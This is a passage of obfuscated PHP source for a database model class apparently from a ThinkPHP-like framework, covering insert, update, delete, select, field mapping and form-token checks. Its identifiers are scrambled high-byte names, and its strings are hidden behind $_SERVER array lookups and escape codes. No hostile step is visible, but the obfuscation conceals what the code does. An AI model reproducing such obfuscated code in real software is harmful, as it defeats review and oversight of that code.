$¸¯Úºšù[10] || $ã…ú–Œ¤ ? $¸¯Úºšù[12] : $Ü«­‰; for ($¬æËÊÑ = 1; $¬æËÊÑ <= count($œá´Ü) + 1; $¬æËÊÑ++) { $œ¼¹×Ì’ = substr($ïÖÆ˜, 0, strlen($ïÖÆ˜) - strlen($Ü«­‰)); $çÖøäËÏ = $œ¼¹×Ì’ . "\x28{$¬æËÊÑ}\x29{$Ü«­‰}"; if (!in_array_not_case($çÖøäËÏ, $œá´Ü)) { return $çÖøäËÏ; } } } } goto B”ÕªùöìÎ; b†¾ˆÜ¸õÆ: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\x62\154\145", "\x6f\162\144\145\x72", "\x61\154\x69\x61\x73", "\150\x61\x76\151\x6e\147", "\x67\x72\x6f\165\x70", "\x6c\x6f\143\x6b", "\x64\151\163\164\x69\x6e\x63\x74", "\141\165\x74\157", "\146\x69\x6c\164\x65\162", "\166\x61\x6c\151\144\x61\164\x65", "\x72\145\x73\165\154\164", "\x62\x69\x6e\x64", "\164\x6f\153\x65\156"); public function __construct($ıÉ¢§»£ = '', $‰¦²‰ = '', $§¹Ğ“¦ = '') { $¡­‚î²Š =& $_SERVER[ĞÂ¤àÓï]; $this->_initialize(); if (!empty($ıÉ¢§»£)) { if (strpos($ıÉ¢§»£, $¡­‚î²Š[10])) { list($this->dbName, $this->name) = explode($¡­‚î²Š[10], $ıÉ¢§»£); } else { $this->name = $ıÉ¢§»£; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($‰¦²‰)) { $this->tablePrefix = $¡­‚î²Š[12]; } elseif ($¡­‚î²Š[12] != $‰¦²‰) { $this->tablePrefix = $‰¦²‰; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($¡­‚î²Š[244]); } $this->db(0, empty($this->connection) ? $§¹Ğ“¦ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $¬¨£Ñ†¬ =& $_SERVER[ĞÂ¤àÓï]; if (empty($this->fields)) { if (think_config($¬¨£Ñ†¬[245])) { $·£‘Üƒœ = $this->dbName ? $this->dbName : think_config($¬¨£Ñ†¬[246]); $Çâ®÷ç = think_var_cache($¬¨£Ñ†¬[247] . strtolower(get_path_this($·£‘Üƒœ) . $¬¨£Ñ†¬[10] . $this->name)); if ($Çâ®÷ç) { $ñ··†°ˆ = think_config($¬¨£Ñ†¬[248]); if (empty($ñ··†°ˆ) || $Çâ®÷ç[$¬¨£Ñ†¬[249]] == $ñ··†°ˆ) { $this->fields = $Çâ®÷ç; return; } } } $this->flush(); } } public function flush() { $«íç¨‡û =& $_SERVER[ĞÂ¤àÓï]; $this->db->setModel($this->name); $Ïİ¼İ ¥ = $this->db->getFields($this->getTableName()); if (!$Ïİ¼İ ¥) { return !1; } $this->fields = array_keys($Ïİ¼İ ¥); $this->fields[$«íç¨‡û[250]] = !1; foreach ($Ïİ¼İ ¥ as $ş¦£Çº => $ÔÛûÑÛ“) { $ï°áÉÛ[$ş¦£Çº] = $ÔÛûÑÛ“[$«íç¨‡û[33]]; if ($ÔÛûÑÛ“[$«íç¨‡û[39]]) { $this->fields[$«íç¨‡û[251]] = $ş¦£Çº; if ($ÔÛûÑÛ“[$«íç¨‡û[42]]) { $this->fields[$«íç¨‡û[250]] = !0; } } } $this->fields[$«íç¨‡û[252]] = $ï°áÉÛ; if (think_config($«íç¨‡û[248])) { $this->fields[$«íç¨‡û[249]] = think_config($«íç¨‡û[248]); } if (think_config($«íç¨‡û[245])) { $ÖºæäÃ = $this->dbName ? $this->dbName : think_config($«íç¨‡û[246]); think_var_cache($«íç¨‡û[247] . strtolower(get_path_this($ÖºæäÃ) . $«íç¨‡û[10] . $this->name), $this->fields); } } public function switchModel($ç´¼–²Ÿ, $öô•à‰ = array()) { $¬ÁÂª =& $_SERVER[ĞÂ¤àÓï]; $šÖ²•° = ucwords(strtolower($ç´¼–²Ÿ)) . $¬ÁÂª[253]; if (!class_exists($šÖ²•°)) { think_exception($šÖ²•° . think_lang($¬ÁÂª[254])); } $this->_extModel = new $šÖ²•°($this->name); if (!empty($öô•à‰)) { foreach ($öô•à‰ as $É‰ıÌ©Â) { $this->_extModel->setProperty($É‰ıÌ©Â, $this->{$É‰ıÌ©Â}); } } return $this->_extModel; } public function __set($´¨²¢åª, $ËÀ¾×Ì±) { $this->data[$´¨²¢åª] = $ËÀ¾×Ì±; } public function __get($ŸáÃ¨’ˆ) { return isset($this->data[$ŸáÃ¨’ˆ]) ? $this->data[$ŸáÃ¨’ˆ] : null; } public function __isset($ñÉØ»ù°) { return isset($this->data[$ñÉØ»ù°]); } public function __unset($ñ¤ äëÑ) { unset($this->data[$ñ¤ äëÑ]); } public function __call($Á ÂÆúÖ, $ïŠœÂìı) { $ß¦ÚÅø =& $_SERVER[ĞÂ¤àÓï]; if (in_array(strtolower($Á ÂÆúÖ), $this->methods, !0)) { $this->options[strtolower($Á ÂÆúÖ)] = $ïŠœÂìı[0]; return $this; } elseif (in_array(strtolower($Á ÂÆúÖ), array($ß¦ÚÅø[255], $ß¦ÚÅø[256], $ß¦ÚÅø[257], $ß¦ÚÅø[258], $ß¦ÚÅø[259]), !0)) { $€…©û¼Õ = isset($ïŠœÂìı[0]) ? $ïŠœÂìı[0] : $ß¦ÚÅø[188]; $€…©û¼Õ = $this->db->parseKey($€…©û¼Õ); return $this->getField(strtoupper($Á ÂÆúÖ) . $ß¦ÚÅø[260] . $€…©û¼Õ . $ß¦ÚÅø[261] . $Á ÂÆúÖ, $ß¦ÚÅø[255]); } elseif (strtolower(substr($Á ÂÆúÖ, 0, 5)) == $ß¦ÚÅø[262]) { $€…©û¼Õ = think_parse_name(substr($Á ÂÆúÖ, 5)); $âşé…›°[$€…©û¼Õ] = $ïŠœÂìı[0]; return $this->where($âşé…›°)->find(); } elseif (strtolower(substr($Á ÂÆúÖ, 0, 10)) == $ß¦ÚÅø[263]) { $Œ‚Ÿ™Ú = think_parse_name(substr($Á ÂÆúÖ, 10)); $âşé…›°[$Œ‚Ÿ™Ú] = $ïŠœÂìı[0]; return $this->where($âşé…›°)->getField($ïŠœÂìı[1]); } elseif (isset($this->_scope[$Á ÂÆúÖ])) { return $this->scope($Á ÂÆúÖ, $ïŠœÂìı[0]); } elseif (method_exists($this, $Á ÂÆúÖ)) { array_unshift($ïŠœÂìı, $Á ÂÆúÖ); return call_user_func_array(array($this, $ß¦ÚÅø[264]), $ïŠœÂìı); } else { return call_user_func_array(array(parent, $Á ÂÆúÖ), $ïŠœÂìı); } } protected function call() { $È®õ¶ƒõ =& $_SERVER[ĞÂ¤àÓï]; $ÌÃµ–º = func_get_args(); $Œƒ‰¾ôš = array_shift($ÌÃµ–º); $âš¸Â¶É = $Œƒ‰¾ôš; if (is_array($Œƒ‰¾ôš)) { $âš¸Â¶É = $Œƒ‰¾ôš[1]; $Œƒ‰¾ôš = $Œƒ‰¾ôš[0]; } $·ô„‡Ì× = count($ÌÃµ–º) - 1; if (isset($ÌÃµ–º[$·ô„‡Ì×]) && $ÌÃµ–º[$·ô„‡Ì×] === $Œƒ‰¾ôš) { think_exception(__CLASS__ . $È®õ¶ƒõ[4] . $Œƒ‰¾ôš . think_lang($È®õ¶ƒõ[265])); return; } $ÌÃµ–º[] = $Œƒ‰¾ôš; if (method_exists($this, $È®õ¶ƒõ[266])) { $î‰³˜å® = call_user_func_array(array($this, $È®õ¶ƒõ[267]), array($âš¸Â¶É, $ÌÃµ–º)); if (!is_null($î‰³˜å®) && $î‰³˜å® !== !1) { return $î‰³˜å®; } } $ûæ›Ñû¿ = call_user_func_array(array($this, $Œƒ‰¾ôš), $ÌÃµ–º); if (method_exists($this, $È®õ¶ƒõ[268])) { $î‰³˜å® = call_user_func_array(array($this, $È®õ¶ƒõ[269]), array($âš¸Â¶É, $ÌÃµ–º, $ûæ›Ñû¿)); if ($î‰³˜å®) { return $î‰³˜å®; } } return $ûæ›Ñû¿; } protected function _initialize() { } protected function _facade($Âº½Àˆ») { $ƒı®®† =& $_SERVER[ĞÂ¤àÓï]; if (!empty($this->fields)) { foreach ($Âº½Àˆ» as $šš½Î¦Ş => $Ä÷µ±¢) { if (is_array($this->fields) && !in_array($šš½Î¦Ş, $this->fields, !0)) { unset($Âº½Àˆ»[$šš½Î¦Ş]); } elseif (is_scalar($Ä÷µ±¢)) { $this->_parseType($Âº½Àˆ», $šš½Î¦Ş); } } } if (!empty($this->options[$ƒı®®†[270]])) { $Âº½Àˆ» = array_map($this->options[$ƒı®®†[270]], $Âº½Àˆ»); unset($this->options[$ƒı®®†[270]]); } $this->_beforeWrite($Âº½Àˆ»); return $Âº½Àˆ»; } protected function _beforeWrite(&$¡øçÕÙÏ) { } public function add($ÚëìÇ‚ğ = '', $ÖÏŞ¶¤ = array(), $ê”Öù£ = false) { if (empty($ÚëìÇ‚ğ)) { if (!empty($this->data)) { $ÚëìÇ‚ğ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ĞÂ¤àÓï][271]); return !1; } } $ÖÏŞ¶¤ = $this->_parseOptions($ÖÏŞ¶¤); $ÚëìÇ‚ğ = $this->_facade($ÚëìÇ‚ğ); if (!1 === $this->_beforeInsert($ÚëìÇ‚ğ, $ÖÏŞ¶¤)) { return !1; } $¯¯ÂÕ§ = $this->db->insert($ÚëìÇ‚ğ, $ÖÏŞ¶¤, $ê”Öù£); if (!1 !== $¯¯ÂÕ§) { $óÔÍÉá = $this->getLastInsID(); if ($óÔÍÉá) { $ÚëìÇ‚ğ[$this->getPk()] = $óÔÍÉá; $this->_after_insert($ÚëìÇ‚ğ, $ÖÏŞ¶¤); return $óÔÍÉá; } $this->_after_insert($ÚëìÇ‚ğ, $ÖÏŞ¶¤); } return $¯¯ÂÕ§; } protected function _beforeInsert(&$Ûä§š, $í ¦â¶Î) { } protected function _after_insert($äú‚“ÉÕ, $¹†ıÌş“) { } public function addAll($Œ…«Çó, $‚³†øŒ = array(), $¸ŒºÛê = false) { $¨µ½¸ÑŞ =& $_SERVER[ĞÂ¤àÓï]; if (empty($Œ…«Çó)) { $this->error = think_lang($¨µ½¸ÑŞ[271]); return !1; } $‚³†øŒ = $this->_parseOptions($‚³†øŒ); foreach ($Œ…«Çó as $€ÀÂ€ò => $Òïú…±ƒ) { $Œ…«Çó[$€ÀÂ€ò] = $this->_facade($Òïú…±ƒ); } if (method_exists($this->db, $¨µ½¸ÑŞ[272])) { $ı´¬Ó¹ä = $this->db->insertAll($Œ…«Çó, $‚³†øŒ, $¸ŒºÛê); } else { $this->startTrans(); foreach ($Œ…«Çó as $€ÀÂ€ò => $Òïú…±ƒ) { $ı´¬Ó¹ä = $this->db->insert($Òïú…±ƒ, $‚³†øŒ, $¸ŒºÛê); } $this->commit(); } if (!1 !== $ı´¬Ó¹ä) { $­Ôª™Îä = $this->getLastInsID(); if ($­Ôª™Îä) { return $­Ôª™Îä; } } return $ı´¬Ó¹ä; } public function selectAdd($“Ë„¿É = '', $ÖñĞú = '', $ğßä÷ûÛ = array()) { $Ç×ÀÚœ =& $_SERVER[ĞÂ¤àÓï]; $ğßä÷ûÛ = $this->_parseOptions($ğßä÷ûÛ); if (!1 === ($ŸèÜÓÙ = $this->db->selectInsert($“Ë„¿É ? $“Ë„¿É : $ğßä÷ûÛ[$Ç×ÀÚœ[273]], $ÖñĞú ? $ÖñĞú : $this->getTableName(), $ğßä÷ûÛ))) { $this->error = think_lang($Ç×ÀÚœ[274]); return !1; } else { return $ŸèÜÓÙ; } } public function save($µÎƒñĞè = '', $‹¢Šùş¶ = array()) { $Ñğ·íÍ =& $_SERVER[ĞÂ¤àÓï]; if (empty($µÎƒñĞè)) { if (!empty($this->data)) { $µÎƒñĞè = $this->data; $this->data = array(); } else { $this->error = think_lang($Ñğ·íÍ[271]); return !1; } } $µÎƒñĞè = $this->_facade($µÎƒñĞè); $‹¢Šùş¶ = $this->_parseOptions($‹¢Šùş¶); $½òœò¯º = $this->getPk(); if (!isset($‹¢Šùş¶[$Ñğ·íÍ[275]])) { if (isset($µÎƒñĞè[$½òœò¯º])) { $»Å«ÛĞ[$½òœò¯º] = $µÎƒñĞè[$½òœò¯º]; $‹¢Šùş¶[$Ñğ·íÍ[275]] = $»Å«ÛĞ; unset($µÎƒñĞè[$½òœò¯º]); } else { $this->error = think_lang($Ñğ·íÍ[274]); return !1; } } if (is_array($‹¢Šùş¶[$Ñğ·íÍ[275]]) && isset($‹¢Šùş¶[$Ñğ·íÍ[275]][$½òœò¯º])) { $›üËÑúÌ = $‹¢Šùş¶[$Ñğ·íÍ[275]][$½òœò¯º]; } if (!1 === $this->_beforeUpdate($µÎƒñĞè, $‹¢Šùş¶)) { return !1; } $îâÆÔä‰ = $this->db->update($µÎƒñĞè, $‹¢Šùş¶); if (!1 !== $îâÆÔä‰) { if (isset($›üËÑúÌ)) { $µÎƒñĞè[$½òœò¯º] = $›üËÑúÌ; } $this->_afterUpdate($µÎƒñĞè, $‹¢Šùş¶); } return $îâÆÔä‰; } protected function _beforeUpdate(&$ËÒŒûÃ, $Ã˜×Ò“¥) { } protected function _afterUpdate($šÊ‹…î, $ÌÅ•ü²) { } public function delete($ú³æĞá¸ = array()) { $å‹¨à¼˜ =& $_SERVER[ĞÂ¤àÓï]; if (empty($ú³æĞá¸) && empty($this->options[$å‹¨à¼˜[275]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $«½Ô¼Ï± = $this->getPk(); if (is_numeric($ú³æĞá¸) || is_string($ú³æĞá¸)) { if (strpos($ú³æĞá¸, $å‹¨à¼˜[50])) { $°Ø¾£ë[$«½Ô¼Ï±] = array($å‹¨à¼˜[276], $ú³æĞá¸); } else { $°Ø¾£ë[$«½Ô¼Ï±] = $ú³æĞá¸; } $this->options[$å‹¨à¼˜[275]] = $°Ø¾£ë; } $ú³æĞá¸ = $this->_parseOptions(); if (is_array($ú³æĞá¸[$å‹¨à¼˜[275]]) && isset($ú³æĞá¸[$å‹¨à¼˜[275]][$«½Ô¼Ï±])) { $õæ­Î = $ú³æĞá¸[$å‹¨à¼˜[275]][$«½Ô¼Ï±]; } $ú¥äÉ´ã = $this->db->delete($ú³æĞá¸); if (!1 !== $ú¥äÉ´ã) { $¾œÇˆØ„ = array(); if (isset($õæ­Î)) { $¾œÇˆØ„[$«½Ô¼Ï±] = $õæ­Î; } $this->_after_delete($¾œÇˆØ„, $ú³æĞá¸); } return $ú¥äÉ´ã; } protected function _after_delete($·ğêñ§ª, $ĞñšÍ¥ü) { } public function select($ğöÃŠØ´ = array()) { $´†¦á¼Ú =& $_SERVER[ĞÂ¤àÓï]; if (is_string($ğöÃŠØ´) || is_numeric($ğöÃŠØ´)) { $Åò¿¶€Ÿ = $this->getPk(); if (strpos($ğöÃŠØ´, $´†¦á¼Ú[50])) { $ƒÁÊ·Õ’[$Åò¿¶€Ÿ] = array($´†¦á¼Ú[276], $ğöÃŠØ´); } else { $ƒÁÊ·Õ’[$Åò¿¶€Ÿ] = $ğöÃŠØ´; } $this->options[$´†¦á¼Ú[275]] = $ƒÁÊ·Õ’; } elseif (!1 === $ğöÃŠØ´) { $ğöÃŠØ´ = $this->_parseOptions(); return $´†¦á¼Ú[277] . $this->db->buildSelectSql($ğöÃŠØ´) . $´†¦á¼Ú[278]; } $ğöÃŠØ´ = $this->_parseOptions(); $¤åóí™Ò = $this->db->select($ğöÃŠØ´); if (!1 === $¤åóí™Ò) { return !1; } if (empty($¤åóí™Ò)) { return null; } $this->_afterSelect($¤åóí™Ò, $ğöÃŠØ´); return $¤åóí™Ò; } protected function _afterSelect(&$êÎ˜–›°, $ÓÀ˜”ü›) { } public function buildSql($š˜óõ»¯ = array()) { $ºåĞëÎÓ =& $_SERVER[ĞÂ¤àÓï]; $š˜óõ»¯ = $this->_parseOptions($š˜óõ»¯); return $ºåĞëÎÓ[277] . $this->db->buildSelectSql($š˜óõ»¯) . $ºåĞëÎÓ[278]; } public function optionsValue($ÑÙ™¯åú = null) { if (is_null($ÑÙ™¯åú)) { return $this->options; } elseif (is_array($ÑÙ™¯åú)) { $this->options = array_merge($this->options, $ÑÙ™¯åú); } } protected function _parseOptions($›ªïö¬ş = array()) { $Å±±¢€¤ =& $_SERVER[ĞÂ¤àÓï]; if (is_array($›ªïö¬ş)) { $›ªïö¬ş = array_merge($this->options, $›ªïö¬ş); } $this->options = array(); if (!isset($›ªïö¬ş[$Å±±¢€¤[279]])) { $›ªïö¬ş[$Å±±¢€¤[279]] = $this->getTableName(); $¢¢¤ŠéÛ = $this->fields; } else { $¢¢¤ŠéÛ = $this->getDbFields(); } if (!empty($›ªïö¬ş[$Å±±¢€¤[280]])) { $›ªïö¬ş[$Å±±¢€¤[279]] .= $Å±±¢€¤[53] . $›ªïö¬ş[$Å±±¢€¤[280]]; } $›ªïö¬ş[$Å±±¢€¤[281]] = $this->name; if (isset($›ªïö¬ş[$Å±±¢€¤[275]]) && is_array($›ªïö¬ş[$Å±±¢€¤[275]]) && !empty($¢¢¤ŠéÛ) && !isset($›ªïö¬ş[$Å±±¢€¤[282]]) && !isset($›ªïö¬ş[$Å±±¢€¤[279]])) { foreach ($›ªïö¬ş[$Å±±¢€¤[275]] as $ò©´‘÷ => $ÏÏ€Äå’) { $ò©´‘÷ = trim($ò©´‘÷); if (in_array($ò©´‘÷, $¢¢¤ŠéÛ, !0)) { if (is_scalar($ÏÏ€Äå’)) { $this->_parseType($›ªïö¬ş[$Å±±¢€¤[275]], $ò©´‘÷); } } elseif (!is_numeric($ò©´‘÷) && $Å±±¢€¤[11] != substr($ò©´‘÷, 0, 1) && !1 === strpos($ò©´‘÷, $Å±±¢€¤[10]) && !1 === strpos($ò©´‘÷, $Å±±¢€¤[260]) && !1 === strpos($ò©´‘÷, $Å±±¢€¤[283]) && !1 === strpos($ò©´‘÷, $Å±±¢€¤[284])) { unset($›ªïö¬ş[$Å±±¢€¤[275]][$ò©´‘÷]); } } } $this->_options_filter($›ªïö¬ş); return $›ªïö¬ş; } protected function _options_filter(&$ûÓµ··¼) { } protected function _parseType(&$Ãíî±šî, $õåò“»å) { $ûöº”¾ =& $_SERVER[ĞÂ¤àÓï]; if (empty($this->options[$ûöº”¾[285]][$ûöº”¾[4] . $õåò“»å])) { $â©ÎˆÂĞ = strtolower($this->fields[$ûöº”¾[252]][$õåò“»å]); if (!1 !== strpos($â©ÎˆÂĞ, $ûöº”¾[286])) { } elseif (!1 === strpos($â©ÎˆÂĞ, $ûöº”¾[287]) && !1 !== strpos($â©ÎˆÂĞ, $ûöº”¾[288])) { $Ãíî±šî[$õåò“»å] = intval($Ãíî±šî[$õåò“»å]); } elseif (!1 !== strpos($â©ÎˆÂĞ, $ûöº”¾[289]) || !1 !== strpos($â©ÎˆÂĞ, $ûöº”¾[290])) { $Ãíî±šî[$õåò“»å] = floatval($Ãíî±šî[$õåò“»å]); } elseif (!1 !== strpos($â©ÎˆÂĞ, $ûöº”¾[291])) { $Ãíî±šî[$õåò“»å] = (bool) $Ãíî±šî[$õåò“»å]; } } } public function find($Òê¹ËÕ˜ = array()) { $‰—ñùõı =& $_SERVER[ĞÂ¤àÓï]; if (is_numeric($Òê¹ËÕ˜) || is_string($Òê¹ËÕ˜)) { $üñ ”“°[$this->getPk()] = intval($Òê¹ËÕ˜); $this->options[$‰—ñùõı[275]] = $üñ ”“°; } $this->options[$‰—ñùõı[292]] = 1; $Òê¹ËÕ˜ = $this->_parseOptions(); $·½ò¬“¸ = $this->db->select($Òê¹ËÕ˜); if (!1 === $·½ò¬“¸) { return !1; } if (empty($·½ò¬“¸)) { return null; } $this->data = $·½ò¬“¸[0]; $this->_afterFind($this->data, $Òê¹ËÕ˜); if (!empty($this->options[$‰—ñùõı[293]])) { return $this->returnResult($this->data, $this->options[$‰—ñùõı[293]]); } return $this->data; } protected function _afterFind(&$¸¦¨ÎÒ¬, $À›÷‘¯ ) { } protected function returnResult($°®¢—Ç¼, $Äš¦‹Å² = '') { $Œ±®Ëè¾ =& $_SERVER[ĞÂ¤àÓï]; if ($Äš¦‹Å²) { if (is_callable($Äš¦‹Å²)) { return call_user_func($Äš¦‹Å², $°®¢—Ç¼); } switch (strtolower($Äš¦‹Å²)) { case $Œ±®Ëè¾[294]: return json_encode($°®¢—Ç¼); case $Œ±®Ëè¾[295]: return xml_encode($°®¢—Ç¼); } } return $°®¢—Ç¼; } public function parseFieldsMap($‰¤ÁÈÄ‹, $¨ä×Ç‡é = 1) { if (!empty($this->_map)) { foreach ($this->_map as $î½¾âá => $ŠÂÒ¯Ç) { if ($¨ä×Ç‡é == 1) { if (isset($‰¤ÁÈÄ‹[$ŠÂÒ¯Ç])) { $‰¤ÁÈÄ‹[$î½¾âá] = $‰¤ÁÈÄ‹[$ŠÂÒ¯Ç]; unset($‰¤ÁÈÄ‹[$ŠÂÒ¯Ç]); } } else { if (isset($‰¤ÁÈÄ‹[$î½¾âá])) { $‰¤ÁÈÄ‹[$ŠÂÒ¯Ç] = $‰¤ÁÈÄ‹[$î½¾âá]; unset($‰¤ÁÈÄ‹[$î½¾âá]); } } } } return $‰¤ÁÈÄ‹; } public function setField($¿¤‹Àçú, $Îˆ·«èİ = '') { if (is_array($¿¤‹Àçú)) { $ÃâÇŠû— = $¿¤‹Àçú; } else { $ÃâÇŠû—[$¿¤‹Àçú] = $Îˆ·«èİ; } return $this->save($ÃâÇŠû—); } public function setAdd($¡Æ’¡©Š, $¥ÃãÔŠš = 1) { $şÔª´“ô =& $_SERVER[ĞÂ¤àÓï]; $ûòĞŒª¥ = $¡Æ’¡©Š . $şÔª´“ô[296] . $¥ÃãÔŠš; if ($¥ÃãÔŠš < 0) { $ûòĞŒª¥ = $¡Æ’¡©Š . $¥ÃãÔŠš; } return $this->setField($¡Æ’¡©Š, array($şÔª´“ô[297], $ûòĞŒª¥)); } public function getField($ÁÅÙ±â¾, $¥îøùËŠ = null) { $Ö®Äãùí =& $_SERVER[ĞÂ¤àÓï]; $Ëëö›ß—[$Ö®Äãùí[273]] = $ÁÅÙ±â¾; $Ëëö›ß— = $this->_parseOptions($Ëëö›ß—); $ÁÅÙ±â¾ = trim($ÁÅÙ±â¾); if (strpos($ÁÅÙ±â¾, $Ö®Äãùí[50])) { if (!isset($Ëëö›ß—[$Ö®Äãùí[292]])) { $Ëëö›ß—[$Ö®Äãùí[292]] = is_numeric($¥îøùËŠ) ? $¥îøùËŠ : $Ö®Äãùí[12]; } $¸ÆÑ—  = $this->db->select($Ëëö›ß—); if (!empty($¸ÆÑ— )) { $îŠî¾Í = explode($Ö®Äãùí[50], $ÁÅÙ±â¾); $ÁÅÙ±â¾ = array_keys($¸ÆÑ— [0]); $Š‹¿İØ = array_shift($ÁÅÙ±â¾); $éŠê±€ = array_shift($ÁÅÙ±â¾); $äàˆí¹ = array(); $‰ß„“û¦ = count($îŠî¾Í); foreach ($¸ÆÑ—  as $µÍÓóèñ) { $•å˜»Ê¥ = $µÍÓóèñ[$Š‹¿İØ]; if (2 == $‰ß„“û¦) { $äàˆí¹[$•å˜»Ê¥] = $µÍÓóèñ[$éŠê±€]; } else { $äàˆí¹[$•å˜»Ê¥] = is_string($¥îøùËŠ) ? implode($¥îøùËŠ, $µÍÓóèñ) : $µÍÓóèñ; } } return $äàˆí¹; } } else { if (!0 !== $¥îøùËŠ) { $Ëëö›ß—[$Ö®Äãùí[292]] = is_numeric($¥îøùËŠ) ? $¥îøùËŠ : 1; } if ($¥îøùËŠ === $Ö®Äãùí[255]) { unset($Ëëö›ß—[$Ö®Äãùí[292]]); } $µÍÓóèñ = $this->db->select($Ëëö›ß—); if (!empty($µÍÓóèñ)) { if ($¥îøùËŠ === $Ö®Äãùí[255]) { return reset($µÍÓóèñ[0]); } if (!0 !== $¥îøùËŠ && 1 == $Ëëö›ß—[$Ö®Äãùí[292]]) { return reset($µÍÓóèñ[0]); } foreach ($µÍÓóèñ as $Ñ¢ÙØÜµ) { $ßùƒ‘ÂÒ[] = $Ñ¢ÙØÜµ[$ÁÅÙ±â¾]; } return $ßùƒ‘ÂÒ; } } return null; } public function create($‡ù²“ = '', $¥İÖ¶ì¥ = '') { $•á£Ò³İ =& $_SERVER[ĞÂ¤àÓï]; if (empty($‡ù²“)) { $‡ù²“ = $_POST; } elseif (is_object($‡ù²“)) { $‡ù²“ = get_object_vars($‡ù²“); } if (empty($‡ù²“) || !is_array($‡ù²“)) { $this->error = think_lang($•á£Ò³İ[271]); return !1; } $‡ù²“ = $this->parseFieldsMap($‡ù²“, 0); $¥İÖ¶ì¥ = $¥İÖ¶ì¥ ? $¥İÖ¶ì¥ : (!empty($‡ù²“[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$•á£Ò³İ[273]])) { $Ï²¬†ÕÂ = $this->options[$•á£Ò³İ[273]]; unset($this->options[$•á£Ò³İ[273]]); } elseif ($¥İÖ¶ì¥ == THINK_MODEL_INSERT && isset($this->insertFields)) { $Ï²¬†ÕÂ = $this->insertFields; } elseif ($¥İÖ¶ì¥ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $Ï²¬†ÕÂ = $this->updateFields; } if (isset($Ï²¬†ÕÂ)) { if (is_string($Ï²¬†ÕÂ)) { $Ï²¬†ÕÂ = explode($•á£Ò³İ[50], $Ï²¬†ÕÂ); } if (think_config($•á£Ò³İ[298])) { $Ï²¬†ÕÂ[] = think_config($•á£Ò³İ[299]); } foreach ($‡ù²“ as $‘ã½‰ïè => $È¦»Ó‘) { if (!in_array($‘ã½‰ïè, $Ï²¬†ÕÂ)) { unset($‡ù²“[$‘ã½‰ïè]); } } } if (!$this->autoValidation($‡ù²“, $¥İÖ¶ì¥)) { return !1; } if (!$this->autoCheckToken($‡ù²“)) { $this->error = think_lang($•á£Ò³İ[300]); return !1; } if ($this->autoCheckFields) { $Ï²¬†ÕÂ = $this->getDbFields(); foreach ($‡ù²“ as $‘ã½‰ïè => $È¦»Ó‘) { if (!in_array($‘ã½‰ïè, $Ï²¬†ÕÂ)) { unset($‡ù²“[$‘ã½‰ïè]); } elseif (MAGIC_QUOTES_GPC && is_string($È¦»Ó‘)) { $‡ù²“[$‘ã½‰ïè] = stripslashes($È¦»Ó‘); } } } $this->autoOperation($‡ù²“, $¥İÖ¶ì¥); $this->data = $‡ù²“; return $‡ù²“; } public function autoCheckToken($›Œ¼Şé) { $ÓµÜÌÉ =& $_SERVER[ĞÂ¤àÓï]; if (isset($this->options[$ÓµÜÌÉ[301]]) && !$this->options[$ÓµÜÌÉ[301]]) { return !0; } if (think_config($ÓµÜÌÉ[298])) { $ÏŞàÎ = think_config($ÓµÜÌÉ[299]); if (!isset($›Œ¼Şé[$ÏŞàÎ]) || Session::get($ÏŞàÎ)) { return !1; } list($“ìïäèö, $ßŸÄ“¾À) = explode($ÓµÜÌÉ[11], $›Œ¼Şé[$ÏŞàÎ]); if ($ßŸÄ“¾À && Session::get($ÏŞàÎ . $ÓµÜÌÉ[10] . $“ìïäèö) === $ßŸÄ“¾À) { Session::remove($ÏŞàÎ . $ÓµÜÌÉ[10] . $“ìïäèö); return !0; } if (think_config($ÓµÜÌÉ[302])) { Session::remove($ÏŞàÎ . $ÓµÜÌÉ[10] . $“ìïäèö); } return !1; } return !0; } public function regex($Û¤”ÃùÆ, $Ë¬€÷‚¡) { $§ó¹‰£½ =& $_SERVER[ĞÂ¤àÓï]; $…À«¯øÇ = array($§ó¹‰£½[303] => $§ó¹‰£½[304], $§ó¹‰£½[305] => $§ó¹‰£½[306], $§ó¹‰£½[307] => $§ó¹‰£½[308], $§ó¹‰£½[309] => $§ó¹‰£½[310], $§ó¹‰£½[311] => $§ó¹‰£½[312], $§ó¹‰£½[313] => $§ó¹‰£½[314], $§ó¹‰£½[315] => $§ó¹‰£½[316], $§ó¹‰£½[290] => $§ó¹‰£½[317], $§ó¹‰£½[318] => $§ó¹‰£½[319]); if (isset($…À«¯øÇ[strtolower($Ë¬€÷‚¡)])) { $Ë¬€÷‚¡ = $…À«¯øÇ[strtolower($Ë¬€÷‚¡)]; } return preg_match($Ë¬€÷‚¡, $Û¤”ÃùÆ) === 1; } private function autoOperation(&$‘ó¦‘Èø, $Á‹ÙÂü) { $Ú¢ˆ¯ëÆ =& $_SERVER[ĞÂ¤àÓï]; if (!empty($this->options[$Ú¢ˆ¯ëÆ[320]])) { $ÊÊ¹ÃôÚ = $this->options[$Ú¢ˆ¯ëÆ[320]]; unset($this->options[$Ú¢ˆ¯ëÆ[320]]); } elseif (!empty($this->_auto)) { $ÊÊ¹ÃôÚ = $this->_auto; } if (isset($ÊÊ¹ÃôÚ)) { foreach ($ÊÊ¹ÃôÚ as $ˆ¿Ãöí) { if (empty($ˆ¿Ãöí[2])) { $ˆ¿Ãöí[2] = THINK_MODEL_INSERT; } if ($Á‹ÙÂü == $ˆ¿Ãöí[2] || $ˆ¿Ãöí[2] == THINK_MODEL_BOTH) { switch (trim($ˆ¿Ãöí[3])) { case $Ú¢ˆ¯ëÆ[321]: case $Ú¢ˆ¯ëÆ[322]: $¾½…¶ô‰ = isset($ˆ¿Ãöí[4]) ? (array) $ˆ¿Ãöí[4] : array(); if (isset($‘ó¦‘Èø[$ˆ¿Ãöí[0]])) { array_unshift($¾½…¶ô‰, 